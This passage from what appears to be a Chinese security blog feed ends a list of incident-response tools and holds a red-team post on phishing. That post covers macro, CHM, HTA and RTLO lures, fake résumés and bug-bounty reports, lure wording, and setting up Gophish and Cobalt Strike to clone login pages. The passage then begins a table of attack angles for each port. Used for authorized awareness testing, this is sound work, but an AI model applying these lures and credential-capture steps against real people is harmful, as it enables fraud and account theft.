<li><p>火绒安全软件：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p>
</li>
<li><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p>
</li>
<li><p>ESET NOD32 Antivirus: <a href="https://www.eset.com/us/home/antivirus/download/">https://www.eset.com/us/home/antivirus/download/</a></p>
</li>
</ul>
<h3 id="5-Webshell查杀"><a href="#5-Webshell查杀" class="headerlink" title="5. Webshell查杀"></a>5. Webshell查杀</h3><ul>
<li><p>百度WEBDIR+：<a href="https://scanner.baidu.com/">https://scanner.baidu.com/</a></p>
</li>
<li><p>河马查杀：<a href="https://www.shellpub.com/">https://www.shellpub.com/</a></p>
</li>
<li><p>Web Shell Detector：<a href="http://www.shelldetector.com/">http://www.shelldetector.com/</a></p>
</li>
<li><p>D盾_Web查杀：<a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></p>
</li>
</ul>
<h3 id="6-勒索软件解密"><a href="#6-勒索软件解密" class="headerlink" title="6. 勒索软件解密"></a>6. 勒索软件解密</h3><ul>
<li><p>勒索病毒解密工具收集汇总：<a href="https://github.com/jiansiting/Decryption-Tools">https://github.com/jiansiting/Decryption-Tools</a></p>
</li>
<li><p>[腾讯哈勃]勒索软件专杀工具：<a href="https://habo.qq.com/tool/index">https://habo.qq.com/tool/index</a></p>
</li>
<li><p>[金山毒霸]勒索病毒免疫工具：<a href="http://www.duba.net/dbt/wannacry.html">http://www.duba.net/dbt/wannacry.html</a></p>
</li>
<li><p>[瑞星]解密工具下载：<a href="http://it.rising.com.cn/fanglesuo/index.html">http://it.rising.com.cn/fanglesuo/index.html</a></p>
</li>
<li><p>[卡巴斯基]免费勒索解密器：<a href="https://noransom.kaspersky.com/">https://noransom.kaspersky.com/</a></p>
</li>
<li><p>[Avast]免费勒索软件解密工具：<a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">https://www.avast.com/zh-cn/ransomware-decryption-tools</a></p>
</li>
<li><p>[Emsisoft]免费勒索软件解密工具：<a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">https://www.emsisoft.com/ransomware-decryption-tools/free-download</a></p>
</li>
<li><p>[nomoreransom]勒索软件解密工具集：<a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a></p>
</li>
<li><p>[MalwareHunterTeam]勒索软件解密工具集：<a href="https://id-ransomware.malwarehunterteam.com/">https://id-ransomware.malwarehunterteam.com/</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>Incident Response</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>钓鱼邮件姿势总结</title>
    <url>/posts/20001/</url>
    <content><![CDATA[<center>本文从实战角度对钓鱼邮件攻击思路、姿势、场景、搭建进行研究总结…</center>

<span id="more"></span>

<h2 id="0x01-攻击方式"><a href="#0x01-攻击方式" class="headerlink" title="0x01 攻击方式"></a>0x01 攻击方式</h2><h3 id="1-恶意链接"><a href="#1-恶意链接" class="headerlink" title="1. 恶意链接"></a>1. 恶意链接</h3><p><strong>简介</strong></p>
<p>LNK（快捷方式或符号链接）是引用其他文件或程序的方法；快捷方式修改的利用方式，在MITRE ATT@CK中的ID是T0123，攻击者可以使用这种方式来实现持久化</p>
<p><strong>Tips</strong></p>
<pre><code>(1) 用超链接,把元素内容改成想要仿冒的域名

(2) 申请一些和目标域名比较相似的域名

(3) IDN punycode转码域名注册

(4) https证书伪造: Let&#39;s Encrypt、Cloudlare等免费可信证书
</code></pre>
<h3 id="2-文档攻击"><a href="#2-文档攻击" class="headerlink" title="2. 文档攻击"></a>2. 文档攻击</h3><p>通过携带exe、execl、word等附件（附件中包含中恶意宏代码、远控exe）的方式</p>
<pre><code>(1) 内嵌链接

在PDF、Office文档中内嵌一个跳转链接式，通过文字信息的引导，让受害者点开页面；Office、Adobe等应用软件对打开外部链接都会弹框进行安全提醒，这种方式也比较容易引起警觉

(2) Office宏

宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化；恶意宏代码在免杀和增加分析难度的手段上多种多样，除了把VBA代码混淆变形外，利用Excel的特性隐藏代码也很常见

(3) CHM文档

CHM是Windows帮助文件（如电子书）使用的扩展名，此文件可以被植入可执行代码，Cobalt Strike就支持CHM钓鱼文件的生成。成功的利用需要欺骗用户打开恶意的CHM文件，该文件可用于执行恶意代码。其缺点就是打开时会出现弹黑框、卡顿，容易被察觉

(4) 漏洞捆绑文档

利用Office、Adobe、IE等应用软件的漏洞，精心制作成诱饵文档，是APT攻击中的常客

(5) 文件后缀RTLO

RTLO字符全名为“RIGHT-TO-LEFT OVERRIDE”，是一个不可显示的控制类字符，其本质是unicode 字符。可以将任意语言的文字内容按倒序排列，最初是用来支持一些从右往左写的语言的文字，比如阿拉伯语，希伯来语。由于它可以重新排列字符的特性，会被攻击者利用从而达到欺骗目标，使得用户运行某些具有危害性的可执行文件

(6) HTA文件

HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件，本身就是html应用程序，双击就能运行，却比普通网页权限大得多，它具有桌面程序的所有权限。Cobalt Strike也支持HTA钓鱼文件的生成

(7) ⾃解压

把⼀个恶意的⽂件和⼀个图⽚组合在⼀起，打包运⾏后，程序进⾏⾃解压，释放木马

(8) ⾃解压+RLO

把pe⽂件反转成png后缀、修改pe⽂件的ico图标，最后实施⾃解压操作
</code></pre>
<h2 id="0x02-场景案例"><a href="#0x02-场景案例" class="headerlink" title="0x02 场景案例"></a>0x02 场景案例</h2><h3 id="1-简历伪造投递"><a href="#1-简历伪造投递" class="headerlink" title="1. 简历伪造投递"></a>1. 简历伪造投递</h3><p><strong>Tips</strong></p>
<pre><code>1. 模拟真实简历投递：在简历钓⻥邮件中，可伪造名字、联系方式、学校、经历等信息，针对不同岗位(技术、运营、产品经历等)伪造合适的简历，尽量写的漂亮

2. 从官网招聘、领英、拉勾⽹、智联招聘、BOSS直聘、脉脉、v2ex、搜索引擎及其他专业论坛等渠道获取各平台留下简历投递的邮箱信息

3. 简历拥有分发属性，针对HR等安全意识薄弱人员，成功率比较高
</code></pre>
<h3 id="2-邮件及网站伪造"><a href="#2-邮件及网站伪造" class="headerlink" title="2. 邮件及网站伪造"></a>2. 邮件及网站伪造</h3><p>购买⼀个相似域名，编写⼀摸⼀样的登录⻚⾯，访问后做引导，告知让其登录更新；或者伪造邮件服务器，发送全员及针对性邮件，诱导其点击查看邮件附件</p>
<p><strong>话术总结</strong></p>
<pre><code>1. 邮箱账号被异常登录、公司邮箱密码泄漏，账号密码过期，提醒修改更新密码

2. 公司福利活动，请登录指定页面下载领取

3. 最新爆发的漏洞通告及大型安全演练漏洞修复，请打漏洞补丁

4. 系统更新迁移，云服务器包年包月过期，影响服务器列表见邮件附件

5. 内部技术交流分享，请点击直播链接、附件PPT观看

6. 转正评估、绩效自评及评估结果查看，请点击指定页面进行操作

7. 构造钓鱼二维码，诱导员工扫描钓鱼二维码，跳转至指定钓鱼页面
</code></pre>
<h3 id="3-SRC假漏洞"><a href="#3-SRC假漏洞" class="headerlink" title="3. SRC假漏洞"></a>3. SRC假漏洞</h3><p>当⽬标企业存在类似SRC漏洞奖励计划时，可以去提交⼀个假漏洞，把恶意⽂件附在其中，并说是漏洞复现程序，诱导SRC审核人员打开</p>
<p><strong>Tips</strong></p>
<pre><code>1. 最好伪造提交核⼼应⽤高危及严重漏洞，保证“漏洞”的有效性及真实性

2. 当SRC审核⼈员迟迟不点击的时候，可以施加压力，如指出漏洞危害高且影响范围广，若不及时修复承担责任；“指责”SRC人员漏洞审核水平及流程有待提升，审核时间较慢，对安全重视程度低等；其他家SRC流程如何规范、审核时效性如何高等等对比
</code></pre>
<h2 id="0x03-平台搭建"><a href="#0x03-平台搭建" class="headerlink" title="0x03 平台搭建"></a>0x03 平台搭建</h2><h3 id="1-环境-x2F-工具"><a href="#1-环境-x2F-工具" class="headerlink" title="1. 环境&#x2F;工具"></a>1. 环境&#x2F;工具</h3><h4 id="a-VPS"><a href="#a-VPS" class="headerlink" title="a. VPS"></a>a. VPS</h4><p>VPS(邮件服务器&#x2F;钓鱼平台&#x2F;&#x2F;CS Server)，推荐购买国外VPS，按时付费；(国内厂商监管严格、限制较多、whois信息易泄露、SMTP 端口限制)</p>
<h4 id="b-域名"><a href="#b-域名" class="headerlink" title="b. 域名"></a>b. 域名</h4><p>购买与目标公司邮箱相近的域名</p>
<h4 id="c-邮件服务器"><a href="#c-邮件服务器" class="headerlink" title="c. 邮件服务器"></a>c. 邮件服务器</h4><p><strong>方案一：开源自建邮件服务器</strong> - <a href="https://github.com/gyxuehu/EwoMail">EwoMail</a></p>
<p>Ewomail介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 基于Linux的开源邮件服务器软件，集成了一些稳定的组件，可快速搭建，集成组件如下：</span><br><span class="line"></span><br><span class="line">	Postfix：邮件服务器</span><br><span class="line">	Dovecot：IMAP/POP3/邮件存储</span><br><span class="line">	Amavisd：反垃圾和反病毒</span><br><span class="line">	LNMP：nginx,mysql,php</span><br><span class="line">	EwoMail-Admin：WEB邮箱管理后台</span><br><span class="line">	Rainloop：webmail</span><br><span class="line"></span><br><span class="line">2. 数据可单独存储在个人服务器，防止隐私被盗取，保护数据安全</span><br></pre></td></tr></table></figure>

<p>使用体验</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 搭建方便，配置简单，采用自建邮件服务器方案较为推荐</span><br><span class="line"></span><br><span class="line">2. VPS一般会封禁25端口，需选择小众VPS厂商自建邮件服务器，或向客服申请25端口开放；对外发送邮件较麻烦</span><br><span class="line"></span><br><span class="line">3. 自建邮件服务器发送邮件容易被识别为垃圾邮件，即使配置SPF、DKIM也存在被当成垃圾邮件的情况；维护相对较麻烦</span><br></pre></td></tr></table></figure>

<p><strong>方案二：专业电子邮件托管服务</strong> - <a href="https://www.zoho.com/mail/">Zoho Mail</a></p>
<p>使用体验</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 基本可以避免被识别为垃圾邮件的情况</span><br><span class="line"></span><br><span class="line">2. 配置及维护方便，可避免自建邮件服务器带来的一系列问题</span><br><span class="line"></span><br><span class="line">3. 对外发送邮件基本不存在问题，SMTP默认使用465/587端口，加密传输邮件，安全性较高</span><br><span class="line"></span><br><span class="line">4. 实际使用中，与gophish钓鱼平台联动效果较好，基本不需要投入过多时间配置</span><br></pre></td></tr></table></figure>

<p><em>refer：</em> <a href="https://www.10besty.com/best-email-hosting-providers/#two">https://www.10besty.com/best-email-hosting-providers/#two</a></p>
<h4 id="d-钓鱼平台"><a href="#d-钓鱼平台" class="headerlink" title="d. 钓鱼平台"></a>d. 钓鱼平台</h4><p><a href="https://github.com/gophish/gophish">Gophish</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gophish is a powerful, open-source phishing framework that makes it easy to test your organization&#x27;s exposure to phishing</span><br></pre></td></tr></table></figure>

<h4 id="e-红队平台"><a href="#e-红队平台" class="headerlink" title="e. 红队平台"></a>e. 红队平台</h4><p><a href="https://blog.cobaltstrike.com/">Cobalt Strike</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一款优秀的红队攻击平台，主要用于执行有目标的攻击和模拟高级威胁者的后渗透行动；本文主要用此制作钓鱼诱饵、载荷投递及远控，CS的Spear Phish模块也可进行钓鱼测试</span><br></pre></td></tr></table></figure>

<h3 id="2-邮件服务器"><a href="#2-邮件服务器" class="headerlink" title="2. 邮件服务器"></a>2. 邮件服务器</h3><h4 id="a-Ewomail"><a href="#a-Ewomail" class="headerlink" title="a. Ewomail"></a>a. Ewomail</h4><p>参考<a href="http://doc.ewomail.com/docs/ewomail/jianjie">EwoMail 邮件服务器(开源版文档)</a>进行邮件服务器的搭建</p>
<p><strong>邮件基础</strong></p>
<table>
<thead>
<tr>
<th>简称</th>
<th>全名</th>
<th>任务</th>
</tr>
</thead>
<tbody><tr>
<td>MUA</td>
<td>Mail User Agent</td>
<td>供用户写信、读信、寄信的软件。寄信时，以SMTP协议将邮件提交给MTA ；收信时 ，以POP或IMAP协议访问服务器上的邮箱</td>
</tr>
<tr>
<td>MTA</td>
<td>Mail Transfer Agent</td>
<td>负责接收、递送邮件的服务器软件。决定邮件的递送路径，进行必要的地址改写。应该由本地系统收下的邮件，委托给MDA进行最后的投递操作</td>
</tr>
<tr>
<td>MDA</td>
<td>Mail Delivery Agent</td>
<td>负责投递本地邮件到适当的邮箱，MDA可以过滤邮件内容，或是依照用户设定的准则，将邮件分类到适当的邮箱；甚至可以将邮件转回给MTA，以寄到另一个邮箱</td>
</tr>
</tbody></table>
<p><strong>注意事项</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 服务器VPS需要干净环境，要求全新干净系统，最好单独供Ewomail使用，不能安装在已有的nginx,mysql的环境中</span><br><span class="line"></span><br><span class="line">2. 新版本的杀毒软件占用的内存比较多，可参考(http://doc.ewomail.com/docs/ewomail/reduce_memory)降低内存占用</span><br><span class="line"></span><br><span class="line">3. webmail https证书配置：系统自带了本地SSL证书，但未经认证；可使用经互联网经认证的证书，如通过 Let’s Encrypt、Cloudlare等申请免费可信证书</span><br><span class="line"></span><br><span class="line">4. 开放端口：必须打开的端口8000(webmail)，8010(管理后台)，25(SMTP)，143(IMAP)；可修改</span><br><span class="line"></span><br><span class="line">5. DKIM设置：推荐设置域名密钥识别邮件标准，用来防止被判定为垃圾邮件；参考(http://doc.ewomail.com/docs/ewomail/dkim)</span><br></pre></td></tr></table></figure>

<p><strong>问题总结</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 无法连接服务器：邮件无法发送、接收等</span><br><span class="line"></span><br><span class="line">a. 检查VPS服务商是否开放25端口出站方向，如未开放可通过工单、客服等联系运营商申请开放25端口出站方向；或使用465等其他端口发送邮件</span><br><span class="line"></span><br><span class="line">b. 25端口正常的情况下，如果不能链接服务器，请检查域名DNS解析，或做内部通信</span><br><span class="line"></span><br><span class="line">2. 域不允许</span><br><span class="line"></span><br><span class="line">a. 当显示域不允许的时候，先检查域名解析是否已做好，如果只在本地搭建测试，测试内部通信是否正常</span><br><span class="line">	</span><br><span class="line">b. 如以上2个步骤还不行，参考自定义访问路径文章(http://doc.ewomail.com/docs/ewomail/custom_path)，填上具体的访问地址</span><br></pre></td></tr></table></figure>

<p><strong>配置&#x2F;命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 默认安装及配置目录</span><br><span class="line"></span><br><span class="line">/ewomail</span><br><span class="line">.</span><br><span class="line">├── config.ini</span><br><span class="line">├── dkim</span><br><span class="line">├── mail</span><br><span class="line">├── mysql</span><br><span class="line">├── nginx</span><br><span class="line">├── php72</span><br><span class="line">└── www</span><br><span class="line"></span><br><span class="line">2. 管理后台、webmail的nginx配置</span><br><span class="line"></span><br><span class="line">/ewomail/nginx/conf/vhost</span><br><span class="line"></span><br><span class="line">├── ewomail-admin.conf      //管理后台</span><br><span class="line">├── phpmyadmin.conf         //数据库</span><br><span class="line">├── rainloop.conf           //webmail</span><br><span class="line">└── rainloop.conf.ssl       //webmail ssl配置</span><br><span class="line"></span><br><span class="line">3. PHP配置文件: 可修改后台管理或webmail的访问路径</span><br><span class="line"></span><br><span class="line">/ewomail/www/ewomail-admin/core/config.php</span><br><span class="line">	</span><br><span class="line">├── &#x27;url&#x27; =&gt; &#x27;ewomail后台访问路径&#x27;</span><br><span class="line">└── &#x27;webmail_url&#x27; =&gt; &#x27;webmail的访问路径&#x27;</span><br><span class="line"></span><br><span class="line">4. 卸载命令</span><br><span class="line"></span><br><span class="line">$ systemctl stop nginx php-fpm mysqld postfix dovecot amavisd</span><br><span class="line"></span><br><span class="line">$ rm -rf /ewomail</span><br><span class="line"></span><br><span class="line">5. 重启命令</span><br><span class="line"></span><br><span class="line">$ systemctl restart nginx php-fpm mysqld postfix dovecot amavisd</span><br><span class="line"></span><br><span class="line">6. 组件查找</span><br><span class="line"></span><br><span class="line">$ yum install mlocate &amp;&amp; updatedb   // 安装locate所在文件包并更新搜索数据库</span><br><span class="line">	</span><br><span class="line">$ locate amavisd   //查找邮件内容过滤器amavised相关文件/文件夹</span><br></pre></td></tr></table></figure>

<p><strong>管理后台</strong></p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/ewomail.png"></p>
<p><strong>Webmail</strong></p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/webmail.png"></p>
<h4 id="b-Zoho-Mail"><a href="#b-Zoho-Mail" class="headerlink" title="b. Zoho Mail"></a>b. Zoho Mail</h4><p>参考官方文档 <a href="https://www.zoho.com/mail/help/adminconsole/email-hosting-setup.html">Email Hosting Setup in Zoho</a> 进行申请、配置；配置完成后如下：</p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/zoho.png"></p>
<p>SMTP服务配置可参考 <a href="https://www.zoho.com/mail/help/zoho-smtp.html">SMTP Server Configuration - Zoho Mail</a>，完成后在<code>gophish</code>中进行Sending Profiles-邮箱配置</p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/profile.png"></p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/send.png"></p>
<p><code>采用此方案，对外发送邮件基本没什么问题，也不用担心被识别为垃圾邮件</code></p>
<h3 id="3-钓鱼平台"><a href="#3-钓鱼平台" class="headerlink" title="3. 钓鱼平台"></a>3. 钓鱼平台</h3><p><strong>安装运行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 下载解压</span><br><span class="line"></span><br><span class="line">$ wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip</span><br><span class="line"></span><br><span class="line">$ unzip gophish-v0.11.0-linux-64bit.zip -d gophish</span><br><span class="line"></span><br><span class="line">2. 修改配置(config.json)</span><br><span class="line"></span><br><span class="line">admin_server是后台管理页面，将127.0.0.1 改为 0.0.0.0，默认开放的端口3333。phish_server是钓鱼网站，默认开放80端口</span><br><span class="line"></span><br><span class="line">3. 启动运行</span><br><span class="line"></span><br><span class="line">$ cd gophish &amp;&amp; chmod 640 config.json &amp;&amp; chmod +x gophish</span><br><span class="line"></span><br><span class="line">$ nohup ./gophish &amp;  //后台运行，日志记录至nohup.out文件</span><br><span class="line"></span><br><span class="line">成功启动后，在nohup.out文件中的初始账户密码可用来登录控制台</span><br><span class="line"></span><br><span class="line">4. 首次登录强制修改密码，要求八位以上字符</span><br><span class="line"></span><br><span class="line">地址：https://x.x.x.x:3333/</span><br></pre></td></tr></table></figure>

<p><strong>功能介绍</strong></p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/phish.png"></p>
<center>功能|<center>简述
---|---
Dashboard|仪表板，查看整体钓鱼情况
Campaigns|作战配置，每次攻击前需要配置一次
Users & Groups|用户和用户组（添加需要进行钓鱼的邮箱和相关信息）
Email Templates|电子邮件模板
Landing Pages|需要伪造的钓鱼页面
Sending Profiles|钓鱼邮箱发送配置
Account Settings|账户、UI、报告等设置

<h3 id="4-CS-平台"><a href="#4-CS-平台" class="headerlink" title="4. CS 平台"></a>4. CS 平台</h3><p>搭建及使用可参考<a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">A-Team: Cobalt Strike 4.0 手册</a>及<a href="https://wbglil.gitbook.io/cobalt-strike/">Cobalt Strike Book</a></p>
<p><strong>目录简介</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  CobaltStrike4.1 tree -L 1</span><br><span class="line">.</span><br><span class="line">├── agscript               //[拓展应用的脚本]</span><br><span class="line">├── agscript.bat</span><br><span class="line">├── c2lint                 //[检查c2配置文件语法和预览]</span><br><span class="line">├── c2lint.bat</span><br><span class="line">├── cobaltstrike           //[客户端启动程序]</span><br><span class="line">├── cobaltstrike.auth</span><br><span class="line">├── cobaltstrike.bat       //[CS Windows客户端启动程序]</span><br><span class="line">├── CobaltStrikeCN.jar     //[翻译插件]</span><br><span class="line">├── cobaltstrike.jar       //[主体程序]</span><br><span class="line">├── cobaltstrike.store</span><br><span class="line">├── data</span><br><span class="line">├── logs</span><br><span class="line">├── nohup.out              //[后台启动日志记录]-个人创建</span><br><span class="line">├── peclone</span><br><span class="line">├── peclone.bat</span><br><span class="line">├── start.sh               //[服务端后台启动脚本] -个人创建</span><br><span class="line">├── teamserver             //[Linux服务端启动程序]</span><br><span class="line">├── teamserver.bat</span><br><span class="line">└── third-party            //[vnc远程功能的dll等第三方工具]</span><br></pre></td></tr></table></figure>

<p><strong>启动运行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Cobalt Strike 团队服务器建议在VPS Linux 系统上运行，可持久运行，连接便捷</span><br><span class="line"></span><br><span class="line">$ nohup sh start.sh &amp;  //后台启动，日志记录至nohup.out</span><br><span class="line"></span><br><span class="line">启动脚本start.sh：teamserver &lt;server_host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</span><br><span class="line"></span><br><span class="line">2. 客户端选用Windows：运行teamserver.bat启动，输入服务端启动时配置的server_host、password即可</span><br></pre></td></tr></table></figure>

<h2 id="0x04-钓鱼实战"><a href="#0x04-钓鱼实战" class="headerlink" title="0x04 钓鱼实战"></a>0x04 钓鱼实战</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据搭建的钓鱼平台、制定的钓鱼方案，选取个人及同事通用邮箱、内部邮箱进行测试；针对全体员工的钓鱼测试修改收件人邮箱账号即可，原理及方法类似；本测试选取邮箱账户密码更新钓鱼场景，其余场景过程类似</span><br></pre></td></tr></table></figure>
<h3 id="1-创建邮件用户-x2F-组"><a href="#1-创建邮件用户-x2F-组" class="headerlink" title="1. 创建邮件用户&#x2F;组"></a>1. 创建邮件用户&#x2F;组</h3><p>可通过上传CVS文件，进行批量添加邮件账号，批量发送邮件</p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/group.png"></p>
<p>测试选取了两个外部邮件服务商邮件账号、一个内部邮件账号</p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/2_phish_test.png"></p>
<h3 id="2-钓鱼邮件模板"><a href="#2-钓鱼邮件模板" class="headerlink" title="2. 钓鱼邮件模板"></a>2. 钓鱼邮件模板</h3><p>需在钓鱼邮件模板中的html进行更改和添加，可统计哪些人点开了钓鱼邮件，哪些人打开了钓鱼页面</p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/3_template.png"></p>
<pre><code>为了后续记录邮件是否打开，可勾选上AddTrackingImage，它将会在发送的每份邮件源码上插入一个唯一特定的隐藏图片，当邮件被打开时，此隐藏图片则也会被请求，以此来检测该邮件是否被打开，AddFiles则是给邮件添加附件
</code></pre>
<h3 id="3-伪造钓鱼页面"><a href="#3-伪造钓鱼页面" class="headerlink" title="3. 伪造钓鱼页面"></a>3. 伪造钓鱼页面</h3><p>配置好钓鱼邮件后，可以通过LandingPages模块来新建钓鱼网站页面，支持手写 html文件，也可通过导入网站功能，针对目标网页进行克隆; 如以下抓取内部网页邮箱登录界面：</p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/4_page.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 选上CaptureSubmitted Data和CapturePasswords，记录受害者输入的账号和密码，为安全性，暂不选取密码记录</span><br><span class="line"></span><br><span class="line">2. Redirect to 是受害者点击完提交按钮后，自动跳转的网站</span><br></pre></td></tr></table></figure>

<h3 id="4-发起钓鱼攻击"><a href="#4-发起钓鱼攻击" class="headerlink" title="4. 发起钓鱼攻击"></a>4. 发起钓鱼攻击</h3><p>配置Campaigns，填写Name、选择钓鱼邮件模板、选择钓鱼网站模板、填写钓鱼网站 URL、填写发件邮箱、选择受害者邮件组</p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/5_campaign.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">钓鱼网站URL根据实际钓鱼邮件测试情况，填写对应的地址，点击Launch Campaign即可成功发起一次钓鱼邮件攻击测试</span><br></pre></td></tr></table></figure>

<h3 id="5-仪表板查看"><a href="#5-仪表板查看" class="headerlink" title="5. 仪表板查看"></a>5. 仪表板查看</h3><p>实际测试中，选取了三个邮件账号，一个未打开邮件、一个打开邮件并点击链接、一个打开邮件后点击链接并输入登录账号密码，最终结果如下，和测试结果相同：</p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/6_dashboard.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过仪表盘可详细看到那些邮件账户打开了邮件、点击了指定链接、并输入了账户和密码信息；钓鱼链接对主机无危害、仅显示那些账号对其进行了访问</span><br></pre></td></tr></table></figure>
<hr>
<center>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途...</center></center></center>]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Initial Access</tag>
        <tag>Phishing</tag>
      </tags>
  </entry>
  <entry>
    <title>服务渗透指北</title>
    <url>/posts/50959/</url>
    <content><![CDATA[<center>本文记录各类服务渗透思路、方法</center>

<span id="more"></span>
<hr>
<h3 id="端口渗透表"><a href="#端口渗透表" class="headerlink" title="端口渗透表"></a>端口渗透表</h3><table>
<thead>
<tr>
<th>端口</th>
<th>服务</th>
<th>漏洞&#x2F;渗透</th>
</tr>
</thead>
<tbody><tr>
<td>21</td>
<td>ftp&#x2F;vsftpd文件传输协议</td>
<td>爆破&#x2F;嗅探&#x2F;文件上传&#x2F;后门</td>
</tr>
<tr>
<td>22</td>
<td>ssh远程连接</td>
<td>爆破&#x2F;代理转发</td>
</tr>
<tr>
<td>23</td>
<td>Telnet远程连接</td>
<td>爆破&#x2F;嗅探</td>
</tr>
<tr>
<td>25</td>
<td>SMTP邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>53</td>
<td>DNS域名解析系统</td>
<td>DNS区域传输&#x2F;劫持&#x2F; 隧道</td>
</tr>
<tr>
<td>67&#x2F;68</td>
<td>dhcp服务</td>
<td>劫持&#x2F;欺骗</td>
</tr>
<tr>
<td>69</td>
<td>tftp(简单文件传输协议)</td>
<td>尝试下载目标重要配置文件</td>
</tr>
<tr>
<td>110</td>
<td>pop3</td>
<td>爆破&#x2F;嗅探</td>
</tr>
<tr>
<td>137&#x2F;139&#x2F;445</td>
<td>SMB（NETBIOS协议）</td>
<td>爆破&#x2F;未授权访问&#x2F;远程代码执行</td>
</tr>
<tr>
<td>143</td>
<td>IMAP（邮件访问协议）</td>
<td>爆破</td>
</tr>
<tr>
<td>161</td>
<td>SNMP（简单网络管理协议）</td>
<td>爆破&#x2F;搜集目标内网信息</td>
</tr>
<tr>
<td>389</td>
<td>LDAP（轻量目录访问协议 ）</td>
<td>注入&#x2F;未授权访问&#x2F;弱口令&#x2F;匿名访问</td>
</tr>
<tr>
<td>512&#x2F;513&#x2F;514</td>
<td>Linux Rexec服务</td>
<td>爆破&#x2F;Rlogin登陆</td>
</tr>
<tr>
<td>873</td>
<td>Rsync服务</td>
<td>文件上传&#x2F;匿名访问</td>
</tr>
<tr>
<td>1080</td>
<td>socket</td>
<td>爆破&#x2F;内网渗透</td>
</tr>
<tr>
<td>1098&#x2F;1099</td>
<td>JAVA RMI</td>
<td>反序列化远程命令执行漏洞</td>
</tr>
<tr>
<td>1194</td>
<td>openvpn</td>
<td>获取vpn账号,进内网</td>
</tr>
<tr>
<td>1352</td>
<td>Lotus domino邮件服务</td>
<td>爆破&#x2F;弱口令&#x2F;信息泄漏</td>
</tr>
<tr>
<td>1433</td>
<td>mssql</td>
<td>爆破&#x2F;注入攻击&#x2F;提权&#x2F;sa弱口令</td>
</tr>
<tr>
<td>1500</td>
<td>ispmanager主机控制面板</td>
<td>弱口令</td>
</tr>
<tr>
<td>1521-1529</td>
<td>Oracle</td>
<td>注入攻击&#x2F;TNS爆破&#x2F;弹shell</td>
</tr>
<tr>
<td>1723</td>
<td>PPTP（点对点隧道协议 ）</td>
<td>爆破&#x2F;获取vpn账号,进内网</td>
</tr>
<tr>
<td>2049</td>
<td>NFS服务</td>
<td>配置不当</td>
</tr>
<tr>
<td>2082,2083</td>
<td>cPanel主机管理面板登录</td>
<td>弱口令</td>
</tr>
<tr>
<td>2181</td>
<td>zookeeper服务</td>
<td>未授权访问</td>
</tr>
<tr>
<td>2375-2376</td>
<td>Docker Remote API</td>
<td>未授权访问</td>
</tr>
<tr>
<td>2601,2604</td>
<td>zebra路由</td>
<td>默认密码zerbra</td>
</tr>
<tr>
<td>3128</td>
<td>squid代理服务</td>
<td>弱口令</td>
</tr>
<tr>
<td>3306</td>
<td>MySQL</td>
<td>爆破&#x2F;注入&#x2F;拒绝服务&#x2F;提权</td>
</tr>
<tr>
<td>3389</td>
<td>RDP远程桌面连接</td>
<td>爆破&#x2F;shift后门&#x2F;ms12-020</td>
</tr>
<tr>
<td>3690</td>
<td>svn服务</td>
<td>svn泄露&#x2F;未授权访问</td>
</tr>
<tr>
<td>4848</td>
<td>GlassFish控制台</td>
<td>爆破&#x2F;认证绕过</td>
</tr>
<tr>
<td>5000</td>
<td>Docker Redistry</td>
<td>未授权访问</td>
</tr>
<tr>
<td>5432</td>
<td>PostgreSQL</td>
